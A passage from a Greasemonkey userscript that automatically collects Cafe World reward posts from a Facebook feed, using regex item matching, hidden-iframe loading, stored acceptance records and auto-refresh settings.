 '.config_header {font-size:20pt; margin:0;}\n' +
 '.config_desc, .section_desc, .reset {font-size:9pt;}\n' +
 '.center {text-align:center;}\n' +
 '.section_header_holder {margin-top:8px;}\n' +
 '.config_var {margin:0 0 4px 0; display:block;}\n' +
 '.section_header {font-size:13pt; background:#414141; color:#FFFFFF; border:1px solid #000000; margin:0;}\n' +
 '.section_desc {font-size:9pt; background:#EFEFEF; color:#575757; border:1px solid #CCCCCC; margin:0 0 6px 0;}\n' +
 'input[type="radio"] {margin-right:8px;}',
 stylish: ''},
 create: function(a,b) {
	var ret=window.document.createElement(a);
	if(b) for(var prop in b) {
		if(prop.indexOf('on')==0) ret.addEventListener(prop.substring(2),b[prop],false);
		else if(prop=="kids" && (prop=b[prop])) for(var i=0; i<prop.length; i++) ret.appendChild(prop[i]);
		else if(",style,accesskey,id,name,src,href,for".indexOf(","+prop.toLowerCase())!=-1) ret.setAttribute(prop, b[prop]);
		else ret[prop]=b[prop];
	}
	return ret;
 },
 center: function() {
	var node = GM_config.frame, style = node.style, beforeOpacity = style.opacity;
	if(style.display=='none') style.opacity='0';
	style.display = '';
	style.top = Math.floor((window.innerHeight/2)-(node.offsetHeight/2)) + 'px';
	style.left = Math.floor((window.innerWidth/2)-(node.offsetWidth/2)) + 'px';
	style.opacity = '1';
 },
 run: function() {
    var script=GM_config.getAttribute('script');
    if(script && typeof script=='string' && script!='') {
      func = new Function(script);
      window.setTimeout(func, 0);
    }
 },
 addEvent: function(el,ev,scr) { el.addEventListener(ev, function() { typeof scr == 'function' ? window.setTimeout(scr, 0) : eval(scr) }, false); },
 remove: function(el) { if(el && el.parentNode) el.parentNode.removeChild(el); },
 toggle : function(e) {
	var node=GM_config.frame.contentDocument.getElementById(e);
	node.style.display=(node.style.display!='none')?'none':'';
	GM_config.setValue(e, node.style.display);
 },
}; // end gm config

// all texts for accepted items, possible here to use for cost covering, etc as added.
var feedItems = {
					dish			              	: { accText : 'Got this dish!', accColor : '#84f97e' },
					achievement_bonus         : { accText : 'Got this achievement bonus!', accColor : '#84f97e' },
					achievement_reward        : { accText : 'Got this achievement reward!', accColor : '#84f97e' },
					dailybonus		           	: { accText : 'Got this daily bonus!', accColor : '#84f97e' },
					masterybonus	          	: { accText : 'Got this mastery boost!', accColor : '#84f97e' },
					friendmission  	         	: { accText : 'Got these extra servings!', accColor : '#84f97e' },
					chef_special_2	         	: { accText : 'Got this dish!', accColor : '#84f97e' },
					spice_help	    	       	: { accText : 'Opened spice crate!', accColor : '#84f97e' },
					loot_share	              : { accText : 'Got your share of the loot!', accColor : '#84f97e' },
					spoil_saved	              : { accText : 'Got this saved dish!', accColor : '#84f97e' },
					lost_recipe		           	: { accText : 'Helped with recipe!', accColor : '#84f97e' },
					waterfall		            	: { accText : 'Got waterfall!', accColor : '#84f97e' },
					wedding_cake	          	: { accText : 'Got wedding cake!', accColor : '#84f97e' },
					mystery_spice	           	: { accText : 'Sent some spice!', accColor : '#84f97e' },
					friend_spice_reward      	: { accText : 'Got this friend spice reward!', accColor : '#84f97e' },
					friendspice		          	: { accText : 'Got this free spice shipment!', accColor : '#84f97e' },
					birthdaycake		   	      : { accText : 'Got this cake!', accColor : '#84f97e' },
					scratch_lotto	    	      : { accText : 'Scratched this ticket!', accColor : '#84f97e' },
					build_a_stove	    	      : { accText : 'Got this stove part!', accColor : '#84f97e' },
					outsidemission     	      : { accText : 'Got this VIP Salad!', accColor : '#84f97e' },
					machinemastery     	      : { accText : 'Got this Energy Refill!', accColor : '#84f97e' },
					taste_test        	      : { accText : 'Got this Taste Test Dish!', accColor : '#84f97e' },
					cateringmissionreminder  	: { accText : 'Got this Catering Reward!', accColor : '#84f97e' },
					cateringhelpfriend       	: { accText : 'Got this Catering Reward!', accColor : '#84f97e' },
					coffeefirstbrewfeed      	: { accText : 'Got this First Brew Reward!', accColor : '#84f97e' },
					questcompletefeed        	: { accText : 'Got this Goal Completion Bonus!', accColor : '#84f97e' },
					bigtipper               	: { accText : 'Got this Big Tip Reward!', accColor : '#84f97e' },
					collections              	: { accText : 'Got this Collections Reward!', accColor : '#84f97e' },
					buildanx                	: { accText : 'Helped This Friend!', accColor : '#84f97e' },
					specialdelivery          	: { accText : 'Helped This Friend!', accColor : '#84f97e' },
					cookingacademy          	: { accText : 'Got this Special Delivery!', accColor : '#84f97e' },
					questaskforhelp          	: { accText : 'Helped This Friend!', accColor : '#84f97e' },
					moneytree               	: { accText : 'Got this Holiday Tree Bonus!', accColor : '#84f97e' },
					pastrystationfeed        	: { accText : 'Got this Pastry Station Reward!', accColor : '#84f97e' },
					bbqgrillfeed            	: { accText : 'Got this BBQ Grill Reward!', accColor : '#84f97e' },
					assemblythanks          	: { accText : 'Got this Thank You Bonus!', accColor : '#84f97e' },
					friend_helping_page	      : { accText : 'Helped this friend!', accColor : '#84f97e' }
};

var main = {

// random assortment of vars
paused : false,
pauseClick : false,
boxFull : false,
pauseCount : 0,
profile : "",

// Changeable vars for adaptation to other games (ease of use)

streamID : "home_stream",
// streamID : ($("home_stream") || $("pagelet_home_stream") || $("pagelet_intentional_stream") || $("contentArea")),

gameID : "101539264719", // game id
gameURLpart : "cafeworld", // game url folder for apps.facebook.com/HERE/ (only some games have this)
whitelistWhenPaused : "machinemastery,outsidemission,achievement_reward,achievement_bonus,masterybonus,dailybonus,friend_spice_reward,friendspice", // categories separated by commas to be accepted even if gift box is full
gameName : "Cafe World",
gameAcronym : "CWWM",
gameKeyUrlKeyword : "sk", // used in the regex and xpath to look for "key=" or "sk=" or whatever it may be

// Had to take out 'Send' as blocks mystery/magic spice - added text to exclude stove and Become Neighbors requests
// Had to take out 'Help' as blocks the new goal assistance wall posts - 04-24-11
// xpQueryTextExcludes : ["Visit", "Give item to", "Lend", "Send", "needs parts to build", "Send Energy"],

xpQueryTextExcludes : ["send_me_lightning_stuff_please", "Claim Golden Ticket", "Send Utensils", "Visit", "Give item to", "Lend", "complete her super stove", "complete his super stove", "needs parts to build", "Send Energy", "Become Neighbors", "Send the missing parts", "Send Fairy Dust", "Send Mountain-Fresh Air", "Send Wildflower Essence", "Send Vials of Dewdrops"],

// empty options object for later modification
opts : {},

//
// all regexps are stored here
//

// whichRegex : /(machinemastery|outsidemission|spoil_saved|taste_test|chef_special_2|friend_spice_reward|achievement_reward|achievement_bonus|dailybonus|masterybonus|spice_help|lost_recipe|mystery_spice|scratch_lotto|friendspice|friend_helping_page|build_a_stove|waterfall|wedding_cake|loot_share)/,

whichRegex : /(bbqgrillfeed|assemblythanks|pastrystationfeed|questaskforhelp|chef_special_2|moneytree|cookingacademy|specialdelivery|buildanx|collections|bigtipper|questcompletefeed|coffeefirstbrewfeed|cateringhelpfriend|cateringmissionreminder|friendmission|birthdaycake|machinemastery|outsidemission|spoil_saved|taste_test|friend_spice_reward|achievement_reward|achievement_bonus|dailybonus|masterybonus|spice_help|lost_recipe|mystery_spice|scratch_lotto|friendspice|friend_helping_page|build_a_stove|waterfall|wedding_cake|loot_share)/,

// The following regexs check to see what special processing a wall link requires and branch to the appropriate section
// of code based on the presence of a particular keyword in the url.  The current specialRegex matches against the destination
// page url opened by clicking on the original wall link and not the original wall link url.  Because of several changes in the
// way destination page urls are rendered, we may need to check the original url for a secondary key value and not perform the test
// on the destination page url as is done with the specialRegex string.
//
// Changed the name of specialRegex to specialDestRegex and added specialWallRegex to allow for backward compatibility.  This way
// if you want to test against the destination page url to detemine which block of code to process the item (as has been the case)
// place the keyword to scan for in specialDestRegex.  If the keyword scan needs to be run against the original wall post url string
// then place the keyword to scan for in the specialWallRegex. - RTWG 08-05-10    
//
// Old code
// whichRegex : /(machinemastery|outsidemission|chef_special|achievement_bonus|friendspice|dailybonus|masterybonus|spice_help|lost_recipe|mystery_spice|scratch_lotto|friend_helping_page|build_a_stove|waterfall|wedding_cake|loot_share|spoil_saved)/,
// specialRegex : /(machinemastery|outsidemission|chef_special|masterybonus|scratch_lotto|friendspice|friend_helping_page|thanks_for_helping_friend_in_need|lost_recipe|build_a_stove|waterfall|wedding_cake)/,
//
// New code
                                                                 
specialDestRegex : /(bbqgrillfeed|assemblythanks|pastrystationfeed|questaskforhelp|moneytree|cookingacademy|specialdelivery|buildanx|cateringhelpfriend|cateringmissionreminder|achievement_bonus|dailybonus|scratch_lotto|friendspice|friend_helping_page|thanks_for_helping_friend_in_need|lost_recipe|build_a_stove|waterfall|wedding_cake)/,

// specialWallRegex : /(chef_special_2|machinemastery|outsidemission|spoil_saved|taste_test|friend_spice_reward|achievement_reward|achievement_bonus|masterybonus)/,

specialWallRegex : /(chef_special_2|collections|bigtipper|questcompletefeed|coffeefirstbrewfeed|friendmission|birthdaycake|mystery_spice|machinemastery|outsidemission|spoil_saved|taste_test|friend_spice_reward|achievement_reward|achievement_bonus|masterybonus)/,

lostRecipeRegex : /(grandmas_pie|grandpas_pie)/,
ampRegex : /&amp;/g,
spaceRegex : /\s+/g,

dishRegex :  /(funnel_cake|onion_rings|deep_fried_candy_bar|beef_wellington|snowflake_cake|stardust_stew|bread_pudding|mini_crab_cakes|salmon_rillettes|beef_skewers|homemade_almond_toffee|gem_cake|baked_ham|angel_slices|waldorf_salad|snack_platter|finger_sandwiches|gingerbread_house|chocolate_pecan_pie|deep_fried_turkey|unbirthday_cake|royal_feast|caramel_corn|veggie_sushi|tuna_melt|red_burrito|in_flight_meal|ratatouille|shanghai_dumplings|pastilla|feijoada|anniversary_cake|banana_nut_muffin|tempura_udon|rack_of_lamb|birthday_cupcakes|ranch_beans|pita_and_dolmas|blood_sausage|vampire_staked_steak|escargot|vegetarian_tamales|bbq_chicken|super_sliders|sushi_spread|lox_bagel|raspberry_cheesecake|chocolate_cream_pie|osso_bucco|chicken_vindaloo|falafel|kabayaki|corndog|confit_de_canard|angel_fruit_cake|spicy_devil_eggs|philly_cheesesteak|clubhouse_sandwich|stuffed_mushrooms|sirius_sorbet|vegas_buffet|v.i.p._dinner|martian_brain_bake|giant_dino_eggs|chinese_candy_box|fish_n_chips|lemon_butter_lobster|steak_dinner|creme_fraiche_caviar|ice_cream_sundae|impossible_quiche|smoked_salmon_latkes|chicken_adobo|king_crab_bisque|seafood_paella|bacon_and_eggs|chicken_pot_pie|dino_drumstick|eggs_benedict|fiery_fish_tacos|grand_tandoori_chicken|hotdog_and_garlic_fries|powdered_french_toast|veggie_lasagna|white_radish_cake|buttermilk_pancakes|corned_beef|delicious_chocolate_cake|herbed_halibut|ginger_plum_pork_chops|homestyle_pot_roast|kung_pao_stir_fry|mystical_pizza|overstuffed_peppers|spaghetti_and_meatballs|tom_yum_goong|tony%27s_classic_pizza|voodoo_chicken_salad|bacon_cheeseburger|belgian_waffles|caramel_apples|chicken_gyro_and_fries|jumbo_shrimp_cocktail|lavish_lamb_curry|loco_moco|pumpkin_pie|rackasaurus_ribs|shu_mai_dumplings|spitfire_roasted_chicken|tikka_masala_kabobs|atomic_buffalo_wings|chashu_ramen|chips_and_guacamole|french_onion_soup|macaroni_and_cheese|crackling_peking_duck|savory_stuffed_turkey|triple_berry_cheesecake|tostada_de_carne_asada|jammin%27_jelly_donuts|super_chunk_fruit_salad)/,

keyRegex : null, // will be changed after main is defined - bug
nRegex : /\n+/g,
phpRegex : /#\/.*\.php/,
profileRegex : /facebook\.com\/([^?]+)/i,

// Created by avg, modified by JoeSimmons. shortcut to create an element
create : function(a,b,c) {
	if(a=="text") {return document.createTextNode(b);}
	var ret=document.createElement(a.toLowerCase());
	if(b) for(var prop in b) if(prop.indexOf("on")==0) ret.addEventListener(prop.substring(2),b[prop],false);
		else if(",style,accesskey,id,name,src,href,which,rel".indexOf(","+prop.toLowerCase())!=-1) ret.setAttribute(prop.toLowerCase(), b[prop]);
		else ret[prop]=b[prop];
	if(c) c.forEach(function(e) { ret.appendChild(e); });
	return ret;
},

// cross-browser log function
log: ((isGM) ? GM_log : ((window.opera) ? opera.postError : console.log)),


// click something
click : function(e, type, root) {
	root = (root||document);
	if(!e && typeof e=='string')
		e=document.getElementById(e);
	if(!e)
	{
		return;
	}
	var evObj = document.createEvent('MouseEvents');
	evObj.initMouseEvent((type||'click'),true,true,window,0,0,0,0,0,false,false,false,false,0,null);
	e.dispatchEvent(evObj);
},

// remove something from the page
remove : function(e) {
var node = (typeof e=='string') ? $(e) : e;
if(node) node.parentNode.removeChild(node);
},

// get what type of item it is
which : function(e) {
	var w = e.href.toLowerCase().match(main.whichRegex);

//      GM_log("Which function top - href = " + e.href.toLowerCase());

//   if  (w != null) {      
//       GM_log("Which function top - w = " + w );
//       GM_log("Which function top - w[0] = " + w[0]);
//       GM_log("Which function top - w[1] = " + w[1]);
//   }

//	w = (w!=null) ? w[1] : "none";
	w = (w!=null) ? w[0] : "none";
	
//   if  (w!="none") {      
//       GM_log("Which function - w = " + w );
//       GM_log("Which function - href = " + e.href.toLowerCase());
//   }

//
// Changed logic below so that if a match is found in whichRegex w doesn't just default to a dish
//  
//   switch(w) {
// 		default:	  if (main.whichDish(e) != 'none')
// 					  {
// 						  w = 'dish';
// 					  }
// 					  break;
// 	}

  switch(w) {
		case 'none' :   if (main.whichDish(e) != 'none')
					          {
						          w = 'dish';
					          }
					         
                    break;
	}

//      GM_log("Which function exit - w = " + w );
//      GM_log("Which function exit - href = " + e.href.toLowerCase());


	return w;
},

// get what type of dish it is, if it is a dish
whichDish : function(e) {
	var w = e.href.toLowerCase().match(main.dishRegex);

//   if (w!=null) {
//       GM_log("WhichDish function - w = " + w );
//       GM_log("WhichDish function - href = " + e.href.toLowerCase());
//   }

	w = (w!=null) ? w[1] : "none";

	switch(w) {
		case 'pie' : if (e.href.toLowerCase().indexOf('lost_recipe') != -1) w = 'none'; break;
		case 'apple' : if (e.href.toLowerCase().indexOf('lost_recipe') != -1) w = 'none'; break;
	}

	if (main.opts["dishes"] == false && w != 'none')
		return 'none';
	else
		return w;
},

//
// get what type of special handling case this is?
// Added scan of specialWallRegex - see notes above where specialDestRegex and specialWallRegex are defined
//
whichSpecial : function(e, origurl) {

  // First we check the specialDestRegex for a match as has been the case.
	var w = e.href.toLowerCase().match(main.specialDestRegex);

//       GM_log("WhichSpecial function top - w = " + w );
//       GM_log("WhichSpecial function top - href = " + e.href.toLowerCase());

  // Changed array reference/index to 0 from 1
  //	w = (w!=null) ? w[1] : "none";
	w = (w!=null) ? w[0] : "none";

//   if  (w!="none") {      
//       GM_log("WhichSpecial function - w = " + w );
//       GM_log("WhichSpecial function - href = " + e.href.toLowerCase());
//   }

	switch(w) {
		case 'thanks_for_helping_friend_in_need' : w = 'friend_helping_page'; break;
		case 'wedding_cake' : w = 'waterfall'; break;
	}
	
	// Now check specialWallRegex for a match
	var w2 = origurl.toLowerCase().match(main.specialWallRegex);

//    GM_log("WhichSpecial function - w2 = " + w2 );
//    GM_log("WhichSpecial function - origurl = " + origurl );

	w2 = (w2!=null) ? w2[0] : "none";

  // GM_log("WhichSpecial function - w2 converted = " + w2 );

//  if (w2!="none") {      
//    GM_log("WhichSpecial function - w2 converted = " + w2 );
//    GM_log("WhichSpecial function - origurl = " + origurl.toLowerCase());
//  }


  // Can add any special processing here, as above...yes it could have been done as w = (w2!='none') ? w2 : w
  // but figured would do a switch construct as above for possible future needs. :-) 
	switch(w2) {
		case 'none'           : break;
		default               : w = w2; break;
	}
	
//      GM_log("WhichSpecial function exit - w = " + w );


	return w;
},

// get what type of lost recipe this is.
whichLostRecipe : function(e) {
	var w = e.href.toLowerCase().match(main.lostRecipeRegex);
	w = (w!=null) ? w[1] : "none";
	return w;
},


// function to debug stuff. displays in a big white textarea box
debug : function(s) {
	var d=$("debugT");
	if(!d) 
		document.body.insertBefore(d=main.create("textarea", {id:"debugT",style:"position:fixed; top:20px; left:20px; width:95%; height:90%; color:#000000; background:#ffffff; border:3px ridge #000000; z-index:99999;",ondblclick:function(e){e.target.style.display="none";}}, new Array(main.create("text",s))), document.body.firstChild);
	else 
		d.innerHTML+="\n\n\n\n"+s;
	if(d.style.display=="none") d.style.display="";
},

// get the key for the url
getKey : function(b) {
	return b.replace(main.ampRegex,"&").split("sk=")[1].split("&")[0];
},

// get the accepted items' times they were accepted
getAcceptedTime : function() {
return (new Function("return "+((isGM?GM_getValue:(function(name,def){var s=localStorage.getItem(name); return s==null||s=="undefined"?def:s;}))(main.gameAcronym.toLowerCase()+"_accepted_time_"+main.profile, "({})"))+";"))();
},

// save the accepted items' times they were accepted
setAcceptedTime : function(e) {
var val = JSON.stringify(e), store=main.gameAcronym.toLowerCase()+"_accepted_time_"+main.profile;
	(isGM?GM_setValue:(function(name,value){return localStorage.setItem(name,value)}))(store,val);
},

// reset the accepted items
resetAccepted : function() {
	if(confirm("Really reset accepted items?")) window.setTimeout(function(){
		var reset=(isGM?GM_deleteValue:(function(name,def){return localStorage.setItem(name)}));
		reset(main.gameAcronym.toLowerCase()+"_accepted_"+main.profile, "({})");
		reset(main.gameAcronym.toLowerCase()+"_accepted_time_"+main.profile, "({})");
	}, 0);
},

// get the accepted items
getAccepted : function() {
	return (new Function("return "+((isGM?GM_getValue:(function(name,def){var s=localStorage.getItem(name); return s==null||s=="undefined"?def:s;}))(main.gameAcronym.toLowerCase()+"_accepted_"+main.profile, "({})"))+";"))();
},

// save the accepted items
setAccepted : function(e) {
var val = JSON.stringify(e), store=main.gameAcronym.toLowerCase()+"_accepted_"+main.profile;
(isGM?GM_setValue:(function(name,value){return localStorage.setItem(name,value)}))(store,val);
},

// get number of current requests
get currReqs() {
return $g("count(.//iframe)",{node:$("silent_req_holder"),type:1});
},

// generate a refresh time
get refTime() {
var t=2;
switch(GM_config.get("arinterval")) {
case "sixth": t=0.1666667; break; // 10 seconds
case "half": t=0.5; break; // 30 seconds
case "one": t=1; break; // 1 minute
case "two": t=2; break; // 2 minutes
case "three": t=3; break; // 3 minutes
case "four": t=4; break; // 4 minutes
case "five": t=5; break; // 5 minutes
case "ten": t=10; break; // 10 minutes
}
return Math.round((t*60000)+(Math.random()*(t*250)));
},

// get the real url of the page
get realURL() {
var u=window.location.href, host=window.location.host, protocol=window.location.protocol+"//", hash=window.location.hash;
if(hash!="" && main.phpRegex.test(hash)) u=protocol+host+hash.split("#")[1];
else if(hash!="" && hash.find("#")) u=u.split("#")[0];
return u;
}, // end get realURL

// auto click "like" buttons if enabled
like : function(id) {
var like=$g("//a[@id='"+id+"']/ancestor::span/button[@name='like' and @type='submit']", {type:9});
if(like) like.click();
},

// show config screen
config : function() {
	if(main.currReqs==0) GM_config.open();
	else window.setTimeout(main.config, 250);
}, // end config


similarPosts : function() {
	// Auto click "show x similar posts" links
	if (main.opts['clicksimilar']==false)
		return;
	var similarposts=$g(".//a[@rel='async' and contains(@href,'oldest=') and contains(@href,'newest=')] | .//a[@rel='async' and contains(@ajaxify,'oldest=') and contains(@ajaxify,'newest=')] | .//a[@rel='async' and contains(.,'SHOW') and contains(.,'SIMILAR POSTS')]", {node:main.stream});
	var i = 0, l = similarposts.snapshotLength;
	if(l==0)
		return;
	do {
		main.click(similarposts.snapshotItem(i));
	} while(++i < l);
}, // end similarPosts

// refresh function. be sure to only do it if the config isn't up, it isn't paused, and requests are finished
refresh : function() {
if(!main.paused && !$("GM_config") && main.currReqs==0) {
var i=0, refint=window.setInterval(function() {
	if(i >= 12 && main.currReqs==0) {
		window.clearInterval(refint);
		window.location.replace(main.opts["filteronly"]?"http://www.facebook.com/home.php?filter=app_"+main.gameID+"&show_hidden=true&ignore_self=true&sk=lf":main.realURL);
	}
		else if(i < 12 && main.currReqs==0) i++;
		else i=0;
}, 250);
} else window.setTimeout(main.refresh, (main.currReqs==0?1:main.currReqs)*1000);
},

// update debug status box
status : function() {
switch(main.pauseCount) {
case 0: if(!main.pauseClick) main.paused=false; break;
}
var statusText = !main.boxFull ? (!main.paused?"["+main.gameAcronym+"] "+main.currReqs+" requests currently.":(!main.pauseClick?("["+main.pauseCount+"] "):"")+"[PAUSED] Click this box to unpause") : "[STOPPED] Gift box is full - Refresh to restart";
document.title=statusText;
$("status").textContent = statusText;
if(!main.pauseClick && main.paused && main.pauseCount>0) main.pauseCount--;
},

debugFrame : {	on  : "display:block;width:640px;height:480px;",
				off : "display:none;visibility:hidden;width:0;height:0;"

},

removeDone : function() {
var done = $g(".//a[(contains(@href,'album.php?aid=') and contains(.,' Photos')) or (contains(@href,'"+main.gameURLpart+"') and (starts-with(@id,'item_done_') or starts-with(@id,'item_failed_') or starts-with(@id,'item_skip_') or contains(.,'"+main.xpQueryTextExcludes.join("') or contains(.,'")+"'))) or (contains(@href,'zyn.ga/'))]/ancestor::*[starts-with(@id,'stream_story_') and not(contains(@id, '_collapsed'))]", {node:main.stream});
for(var i=0,len=done.snapshotLength; i<len; i++) if(!$g(".//span[starts-with(@class,'UIActionLinks')]//a[starts-with(@id,'item_processing_')] | .//*[starts-with(@id,'stream_story_') and contains(@id,'_collapsed')]", {type:9, node:done.snapshotItem(i)})) main.remove(done.snapshotItem(i).id);
},

// load an item url
open : function(url, key, w) {
  
  // make sure to stay under the gift box limit but still get all items that don't go into the gift box
	if((main.paused && !(main.whitelistWhenPaused.find(","+w))) || (main.opts["maxrequests"]-main.currReqs) == 0) {
		return; 
	}

  // Changed to avoid potential bug with display:none iframes and added name attr and fixed border attr - added support
  // for showing/hiding request frame  
  // 	$("silent_req_holder").appendChild(main.create("iframe", {src:url, which:w, id:key, style:"display:none;visibility:hidden;width:0;height:0;", onload:function(e) {

//  var normalStyle = "display:none;visibility:hidden;width:0;height:0;";
	
// 	$("silent_req_holder").appendChild(main.create("iframe", {src:url, which:w, name:key, id:key, style:"visibility:hidden; border:0px; width:0; height:0;", onload:function(e) {
	$("silent_req_holder").appendChild(main.create("iframe", {src:url, which:w, name:key, id:key, style:IRF_Style, onload:function(e) {
    var doc=e.target.contentDocument, w=e.target.getAttribute("which"), key=e.target.getAttribute("id"), acc=main.getAccepted(), accTime=main.getAcceptedTime(), item=$("item_"+key);

  // var errorWrapperDiv = doc.getElementById("app101539264719_error_wrapper"); 
  // GM_log("Item Grab Failed Test - failedItem proc retval = " + (failedItem(doc.body.textContent)) );
  // GM_log("Item Grab Failed Test - error_wrapper div found = " + (doc.getElementById("app101539264719_error_wrapper")) );


  if(doc.body.textContent.indexOf("something went wrong in the kitchen")==-1) {
  // if(doc.body.textContent.indexOf("something went wrong in the kitchen")==-1 && !$("errorPageContainer",doc)) {
  // if ( !(failedItem(doc.body.textContent)) && $("app101539264719_error_wrapper",doc) == null ) {
  // if ( !(failedItem(doc.body.textContent)) ) {
  // GM_log("Item Grab Failed Test - PASSED - Starting Special/Post Processing");


			var specialType = main.whichSpecial(doc.location, url); // Added passing wall link url to whichSpecial

       GM_log("Special type switch - specialType= " + specialType + " - w = " + w);
       GM_log("Special type switch - doc.location= " + doc.location);
       GM_log("Special type switch - URL passed in = " + url);

  			// Check for dish and process accordingly
  			if (specialType == 'none' && w == 'dish') {
            GM_log("Entered Select Block Option - dish");
            var dishTargetUrl = url + '&accept=1';
            GM_log("Open Function - processing dish - dishTargetUrl = " + dishTargetUrl);
	   		  e.target.src = dishTargetUrl;
        }
 

			if (specialType != 'none')
			{
  			switch(specialType) {
          case 'chef_special_2' : 
              GM_log("Entered Select Block Option - chef_special_2");
              
              if ( failedItem(doc.body.textContent) ) {
                GM_log("Chef Special item Failed - failedItem proc retval = " + (failedItem(doc.body.textContent)) );
                break;
              }

              var wrapperdiv = "", allLinks = "";  
              if (doc.getElementById("app101539264719_item_wrapper")) {
                wrapperdiv = doc.getElementById('app101539264719_item_wrapper');
                allLinks = wrapperdiv.getElementsByTagName('a');
              }
              else {
                break;
              }                


              if (allLinks.length > 0) {
                // e.target.src = allLinks.item(1).href;  // Now 2nd link
                // doc.location = allLinks.item(1).href;  // Now 2nd link
                clickLink(allLinks.item(1));
                e.target.src = allLinks.item(1).href;  // Now 2nd link
              }
              
              break;


//             var dishTargetUrl = url + '&accept=1';
  //          GM_log("Open Function - processing chef_special_2 - dishTargetUrl = " + dishTargetUrl);
//   	   		  e.target.src = dishTargetUrl;
//   					break;


					case 'dailybonus'  : 
              GM_log("Entered Select Block Option - dailybonus");
              if ( failedItem(doc.body.textContent) ) {
                GM_log("dailybonus item Failed - failedItem proc retval = " + (failedItem(doc.body.textContent)) );
                break;
              }

              var dailybonus_conts = doc.getElementsByClassName('ok reward-button');	
    					if (dailybonus_conts.length > 0)
    				  {
    			       e.target.src=dailybonus_conts.item(0).href;
    				  }
    				  else
    				  {
//                var dailybonus_conts = doc.getElementsByClassName('lotto-container');
//     		        var slot_number = Math.floor(Math.random()*3+1);
//     			      if (dailybonus_conts.length > 0)
//     			      {
//        		        e.target.src=dailybonus_conts.item(slot_number).href;
//     	  	      }
                // If not first one to collect, window displays message
                // "You weren't the first to claim the prize from Joe Doe, but please pick a mystery gift as a thank you!
                // CLICK A GIFT TO UNWRAP IT! " and appears as a (div class="lotto-container") style window
                // with 3 links with class names scratch-area area-1, scratch-area area-2, and scratch-area area-3
                var which_button_number = "scratch-area area-" + Math.floor(Math.random()*3+1);
                var dailybonus_conts = document.getElementsByClassName(which_button_number);
  							if (dailybonus_conts.length > 0)
  							{
  						    e.target.src=dailybonus_conts.item(0).href;
  							}
              }
    				  break;

					case 'spoil_saved' :
              GM_log("Entered Select Block Option - spoil_saved");
              if ( failedItem(doc.body.textContent) ) {
                GM_log("spoil_saved Item Failed Test - failedItem proc retval = " + (failedItem(doc.body.textContent)) );
                break;
              }

              var wrapperdiv = "", allLinks = "";  
              if (doc.getElementById("app101539264719_item_wrapper") ) {
                wrapperdiv = doc.getElementById('app101539264719_item_wrapper');
                allLinks = wrapperdiv.getElementsByTagName('a');
                
                GM_log("spoil_saved allLinks.length = " + allLinks.length);
                GM_log("spoil_saved allLinks item(0) " + allLinks.item(0).href);    
                GM_log("spoil_saved allLinks item(1) " + allLinks.item(1).href);    



              }
              else {
                break;
              }                

//                wrapperdiv = doc.getElementById("app101539264719_item_wrapper");
//                allLinks = wrapperdiv.getElementsByTagName('a');


              if (allLinks.length > 0) {
               clickLink(allLinks.item(1));
            	 e.target.src = allLinks.item(1).href;
              }
              
              break;

//               var spoil_saved_conts = doc.getElementsByClassName('center pad');
//               var spoil_saved_conts_links = spoil_saved_conts.item(0).getElementsByTagName('a');
//               GM_log("spoil_saved_conts_links len= " + spoil_saved_conts_links.length);
//               
//               GM_log("spoil_saved_conts_links item(0) " + spoil_saved_conts_links.item(0).href);    
//               GM_log("spoil_saved_conts_links item(1) " + spoil_saved_conts_links.item(1).href);    
//               
//               if (spoil_saved_conts_links.length > 0)
//               {
//               	e.target.src = spoil_saved_conts_links.item(0).href;
//               }
//               var spoil_saved_conts = doc.getElementsByClassName('center pad');
// 							if (spoil_saved_conts.length > 0)
// 							{
// 							  e.target.src=spoil_saved_conts.item(0).href;
// 							}
// 							else
//               {
//                 var dishTargetUrl = url + '&accept=1';
//       	   		  e.target.src = dishTargetUrl;
//               }
              break;

					case 'achievement_reward'  :
              GM_log("Entered Select Block Option - achievement_reward");

              if ( failedItem(doc.body.textContent) ) {
                GM_log("achievement_reward Item Failed Test - failedItem proc retval = " + (failedItem(doc.body.textContent)) );
                break;
              }

              var achievement_reward_conts = doc.getElementsByClassName('center pad');
							if (achievement_reward_conts.length > 0)
							{
  							e.target.src=achievement_reward_conts.item(0).href;
							}
							else
							{
                // If not first one to collect, window displays message
                // "You weren't the first to claim the prize from Joe Doe, but please pick a mystery gift as a thank you!
                // CLICK A GIFT TO UNWRAP IT! " and appears as a (div class="lotto-container") style window
                // with 3 links with class names scratch-area area-1, scratch-area area-2, and scratch-area area-3
                var which_button_number = "scratch-area area-" + Math.floor(Math.random()*3+1);
                var achievement_reward_conts = document.getElementsByClassName(which_button_number);
  							if (achievement_reward_conts.length > 0)
  							{
  						    e.target.src=achievement_reward_conts.item(0).href;
  							}
              }
						  break;


					case 'taste_test'  :	
              GM_log("Entered Select Block Option - taste_test");

              if ( failedItem(doc.body.textContent) ) {
                GM_log("Taste Test item Failed - failedItem proc retval = " + (failedItem(doc.body.textContent)) );
                break;
              }

              var wrapperdiv = "", allLinks = "";  

              if ( wrapperdiv = doc.getElementById("app101539264719_item_wrapper") ) {
                GM_log("taste_test getElementById app101539264719_item_wrapper Found");
                allLinks = wrapperdiv.getElementsByTagName('a');

                GM_log("taste_test allLinks len= " + allLinks.length);
                GM_log("taste_test allLinks item(0) " + allLinks.item(0).href);    
                GM_log("taste_test allLinks item(1) " + allLinks.item(1).href);    

                if (allLinks.length > 0) {
                 clickLink(allLinks.item(0));
              	 e.target.src = allLinks.item(0).href;  // still first link - 04-15-11
                }
              }

//               else {
//                 break;
//               }                

              // Try again using getElementsByClassName
//               if ( wrapperdiv = document.getElementsByClassName("center pad") ) {
//                 GM_log("taste_test getElementsByClassName center pad Found");
//                 allLinks = wrapperdiv.item(0).getElementsByTagName('a');
// 
//                 GM_log("taste_test allLinks len= " + allLinks.length);
//                 GM_log("taste_test allLinks item(0) " + allLinks.item(0).href);    
//                 GM_log("taste_test allLinks item(1) " + allLinks.item(1).href);    
// 
//                 if (allLinks.length > 0) {
//                  clickLink(allLinks.item(0));
//               	 e.target.src = allLinks.item(0).href;  // still first link - 04-15-11
//                 }
//               }


//                wrapperdiv = doc.getElementById('app101539264719_item_wrapper');
//                allLinks = wrapperdiv.getElementsByTagName('a');

//                 GM_log("taste_test allLinks len= " + allLinks.length);
//                 GM_log("taste_test allLinks item(0) " + allLinks.item(0).href);    
//                 GM_log("taste_test allLinks item(1) " + allLinks.item(1).href);    
// 
//                 if (allLinks.length > 0) {
//                  clickLink(allLinks.item(0));
//               	 e.target.src = allLinks.item(0).href;  // still first link - 04-15-11
//                 }
                
//                break;

//               var taste_test_conts = doc.getElementsByClassName('center pad');
